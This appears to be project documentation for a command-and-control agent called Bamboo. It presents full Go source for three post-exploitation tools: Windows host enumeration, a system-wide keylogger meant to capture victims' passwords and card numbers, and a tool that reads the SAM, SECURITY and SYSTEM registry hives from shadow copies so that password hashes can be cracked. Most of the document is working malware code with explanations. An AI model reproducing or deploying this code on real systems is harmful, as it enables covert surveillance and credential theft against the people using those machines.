# Post Exploitation

## Machine Enumeration

### Description

The purpose of Bamboo’s enumeration tool is to enumerate the target machine first before launching an attack. The tool extracts three primary information:

- installed applications and their versions
- machine’s system version
- security updates installed on the machine (hotfixID and timestamp)

### Implementation

The team implemented the tool as part of the agent’s capabilities, allowing it to gather detailed information about the target system. The tool’s code is shown in the toggle below.

<details>
<summary>Expand code</summary>

```go
package post_exploit

import (
	"fmt"
	"os/exec"
)

func powershellCsv(command string) (outputString string, err error) {
	cmd := exec.Command("powershell", command, "| ConvertTo-Csv -NoTypeInformation")

	output, err := cmd.Output()
	if err != nil {
		return
	}
	outputString = string(output)
	return
}

func EnumerateSystem() (enumerateInfo map[string]string, err error) {
	enumerateInfo = make(map[string]string)

	// get system information
	enumerateInfo["system"], err = powershellCsv("Get-CimInstance -Class Win32_OperatingSystem | Select-Object BuildNumber, Caption, OSArchitecture")
	if err != nil {
		fmt.Println("Error retrieving system information:", err)
		return
	}
	fmt.Println("System Information:")
	fmt.Println(enumerateInfo["system"])

	// retrieve Windows update list
	enumerateInfo["updates"], err = powershellCsv("Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object Description, HotFixID, InstalledOn")
	if err != nil {
		fmt.Println("Error retrieving update list:", err)
		return
	}
	fmt.Println("\nWindows Update List:")
	fmt.Println(enumerateInfo["updates"])

	// get applications
	enumerateInfo["applications"], err = powershellCsv("Get-Package -ProviderName Programs | Select-Object Name, Version | Sort-Object Name")
	if err != nil {
		fmt.Println("Error retrieving installed apps:", err)
		return
	}
	fmt.Println("\nInstalled Apps and Versions:")
	fmt.Println(enumerateInfo["applications"])

	return
}
```
</details>

This program consists of two functions: `powershellCsv` and `EnumerateSystem` .

**powershellCsv Function**

This function takes a PowerShell command as input, executes it, and converts the output to a CSV format.

**EnumerateSystem Function**

This is the main function of the program. It creates a map, **`enumerateInfo`**, to store the collected data. The function then calls **`powershellCsv`** to execute three PowerShell commands:

1. **System Information**

      Retrieves the system's build version, caption, and OS architecture.

1. **Windows Updates**

      Retrieves a list of installed Windows updates.

1. **Installed Applications**

      Retrieves the list of installed applications and their versions.

The output of each command is stored in the **`enumerateInfo`** map with its respective keys: ‘system’, ‘updates’, and ‘applications.

## Keylogging

### Description

Bamboo consists of a keylogging tool to capture keystrokes on the victim’s machine. With this tool, Bamboo Client users could potentially collect sensitive information such as passwords, credit card numbers, and more. 

### Implementation

The team implemented the tool as part of the agent’s capabilities. Its program utilises a GO library, [Gohook](https://github.com/robotn/gohook), which provides a global keyboard and mouse listener hook. The Gohook library uses the Windows API function, `SetWindowsHookEx` , to install a hook procedure that captures keyboard events. Specifically, it installs a **`WH_KEYBOARD`** hook, which captures keyboard events system-wide. The hook procedure is a callback function that is called whenever a keyboard event occurs. In Gohook, this callback function is implemented in Go and is responsible for processing the keyboard event. The program’s code is as shown in the toggle below.

<details>
<summary>Expand code</summary>

```go
package post_exploit

import (
	"fmt"
	"strings"
	"time"

	hook "github.com/robotn/gohook"
)

var keystrokes []string

func hookKeylog(evChan chan hook.Event) {
	for ev := range evChan {
		switch ev.Kind {
		case hook.KeyDown:
			// handle special keys as spaces
			switch ev.Keycode {
			case 8, 9, 13, 16, 17, 18, 32, 33, 34, 35, 36, 37, 38, 40, 45: // keycodes for backspace, tab, enter, space, pageup, pagedown, left, right, up, down, insert, delete, shift, ctrl, alt
				keystrokes = append(keystrokes, " ")
			case 49: // '!'
				keystrokes = append(keystrokes, "!")
			case 50: // '@'
				keystrokes = append(keystrokes, "@")
			case 51: // '#'
				keystrokes = append(keystrokes, "#")
			case 52: // '$'
				keystrokes = append(keystrokes, "$")
			case 53: // '%'
				keystrokes = append(keystrokes, "%")
			case 54: // '^'
				keystrokes = append(keystrokes, "^")
			case 55: // '&'
				keystrokes = append(keystrokes, "&")
			case 56: // '*'
				keystrokes = append(keystrokes, "*")
			case 57: // '('
				keystrokes = append(keystrokes, "(")
			case 48: // ')'
				keystrokes = append(keystrokes, ")")
			case 61: // '='
				keystrokes = append(keystrokes, "=")
			case 91: // '['
				keystrokes = append(keystrokes, "[")
			case 93: // ']'
				keystrokes = append(keystrokes, "]")
			case 92: // '\'
				keystrokes = append(keystrokes, "\\")
			case 59: // ';'
				keystrokes = append(keystrokes, ";")
			case 39: // '''
				keystrokes = append(keystrokes, "'")
			case 44: // ','
				keystrokes = append(keystrokes, ",")
			case 46: // '.'
				keystrokes = append(keystrokes, ".")
			case 47: // '/'
				keystrokes = append(keystrokes, "/")
			case 96: // '`'
				keystrokes = append(keystrokes, "`")
			case 126: // '~'
				keystrokes = append(keystrokes, "~")
			default:
				// for printable characters
				if ev.Keychar >= ' ' && ev.Keychar <= '~' {
					keystrokes = append(keystrokes, string(ev.Keychar))
				} else {
					// for unknown special characters or non-printable keys, handle accordingly
					keystrokes = append(keystrokes, " ") // record other special keys as space
				}
			}
		// exclude mouse events from being recorded
		case hook.MouseDown, hook.MouseUp, hook.MouseMove:
			continue
		}
	}
}

func RunKeylogger(keystrokesChan chan string, stopChan chan bool) {
	// make keystrokes blank
	keystrokes = make([]string, 0)

	// start event hook
	evChan := hook.Start()
	defer hook.End()

	go hookKeylog(evChan)

	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	stop := false
	for !stop {
		<-ticker.C
		// use select with default to make the stop channel not block
		select {
		case stop = <-stopChan:
			fmt.Println("Stopping keylogger...")
		default:
			fmt.Printf("Keystrokes pressed: %s\n", strings.Join(keystrokes, ""))
		}
		// keystrokes = nil // Reset keystrokes slice after printing
	}
	// send back keystrokes through channel
	keystrokesChan <- strings.Join(keystrokes, "")
}

```
</details>

This program consists of two functions: **`hookKeylog`** and **`RunKeylogger`**.

**hookKeylog Function**

This function is responsible for handling keyboard events. It takes a channel of hook events as input and processes each event. When a key is pressed, it appends the corresponding character to the **`keystrokes`** slice. The function handles special keys, such as backspace, tab, and enter, by appending a space to the **`keystrokes`** slice. It also handles special characters by appending the corresponding character to the **`keystrokes`** slice. These special characters are handled explicitly in the **`hookKeylog`** function to ensure that they are recorded correctly in the **`keystrokes`** slice.

**runKeylogger Function**

The function starts an event hook using the **`hook.Start()`** function and defers the **`hook.End()`** function to stop the hook when the program exits. The function then starts a goroutine to process keyboard events using the **`hookKeylog`** function. It also starts a timer to print the keystrokes every 5 seconds.

It listens for a stop signal using **`stopChan`** channel. When a stop signal is received, it stops the keylogger and prints a message indicating that the keylogger has stopped. Finally, the function sends the collected keystrokes through the **`keystrokesChan`** channel.

## Retrieval of Registry Hives

### Description

This tool allows Bamboo Client users to retrieve the SAM (Security Account Manager), SECURITY and SYSTEM files of a Windows machine. These hives contain critical information, detailed in the table below.

| Registry Hive | Description |
| --- | --- |
| SAM | Holds details on local user accounts such as hashed passwords  |
| SYSTEM | Holds details on the system’s hardware and configurations |
| SECURITY | Holds details on user accounts, group policies, and access control lists |

By obtaining these registry hives, Bamboo Client users can obtain hashed passwords, security tokens, and detailed configuration data. They can even attempt to crack the password hash and use the cracked passwords to compromise other areas. 

*Note. This tool can only be used if the Bamboo Agent is at least at a **High** privilege level.*

### Implementation

The team implemented the tool as part of the agent’s capabilities. The program’s code is as shown in the toggle below.

<details>
<summary>Expand code</summary>

```go
package post_exploit

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"regexp"
)

// Get the latest shadow copy volume
func getLatestShadowCopy() (string, error) {
	cmd := exec.Command("vssadmin", "list", "shadows")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", err
	}

	// Extract all shadow copies
	re := regexp.MustCompile(`Shadow Copy Volume: (\\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\d+)`)
	matches := re.FindAllStringSubmatch(out.String(), -1)

	if len(matches) == 0 {
		return "", fmt.Errorf("no shadow copies found")
	}

	// Return the latest shadow copy volume
	return matches[len(matches)-1][1], nil
}

func readFile(sourceFile string) (data []byte, err error) {
	data, err = os.ReadFile(sourceFile)
	if err != nil {
		fmt.Println(err)
	}
	return
}

// read files from shadow copy
func readFilesFromShadowCopy(shadowCopyVolume string) (fileData map[string][]byte, err error) {
	fileData = make(map[string][]byte)
	filesToCopy := []string{"system", "sam", "security"}
	sourceFolder := fmt.Sprintf("%s\\windows\\system32\\config\\", shadowCopyVolume)

	for _, file := range filesToCopy {
		sourceFile := sourceFolder + file
		fmt.Printf("Reading %s\n", sourceFile)

		fileData[file], err = readFile(sourceFile)
		if err != nil {
			err = fmt.Errorf("error copying file %s: %w", file, err)
			return
		}
	}

	return
}

func SSSRetriver() (fileData map[string][]byte, err error) {
	// destinationFolder := "C:\\temp"

	shadowCopyVolume, err := getLatestShadowCopy()
	if err != nil {
		fmt.Printf("An error occurred: %s\n", err)
		return
	}

	fmt.Printf("Latest shadow copy volume: %s\n", shadowCopyVolume)
	fileData, err = readFilesFromShadowCopy(shadowCopyVolume)
	if err != nil {
		fmt.Printf("An error occurred: %s\n", err)
		return
	}

	fmt.Println("Files copied successfully.")
	return
}

```
</details>

This program consists of three functions: **`getLatestShadowCopy`**, **`readFile`**, and **`readFilesFromShadowCopy`**.

**getLatestShadowCopy Function**

This function retrieves the latest shadow copy volume using the **`vssadmin`** command. It runs the command, captures the output, and extracts the latest shadow copy volume using a regular expression.

**readFile Function**

This function reads a file from the specified source file path and returns the file data.

**readFilesFromShadowCopy Function**

This function reads files from the shadow copy volume. It takes the shadow copy volume as input, constructs the source folder path, and reads three specific files: **`system`**, **`sam`**, and **`security`**. The file data is stored in a map with the keys as its file names.

**SSSRetriver Function**

This is the main function of the program. It retrieves the latest shadow copy volume using **`getLatestShadowCopy`**, reads the files from the shadow copy volume using **`readFilesFromShadowCopy`**, and returns the file data.